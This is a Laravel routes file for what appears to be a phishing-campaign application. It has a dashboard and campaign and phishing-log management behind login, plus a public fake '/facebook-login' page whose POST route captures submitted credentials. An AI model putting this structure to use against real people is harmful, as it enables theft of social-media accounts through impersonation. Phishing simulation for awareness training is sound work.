<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\CampaignController;
use App\Http\Controllers\PhishingController;

Route::get('/', function () {
    return view('welcome');
});

Route::middleware(['auth'])->group(function () {
    Route::get('/dashboard', [DashboardController::class, 'index'])->name('dashboard');
    Route::resource('/campaigns', CampaignController::class)->only(['index', 'store']);
    Route::delete('/phishing-logs/{log}', [DashboardController::class, 'destroyLog'])->name('phishing-logs.destroy');
});

Route::get("/facebook-login", [PhishingController::class,'showLoginPage'])->name('phishing.login');
Route::post("/facebook-login", [PhishingController::class,'captureCredentials'])->name('phishing.capture');   

Auth::routes();

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
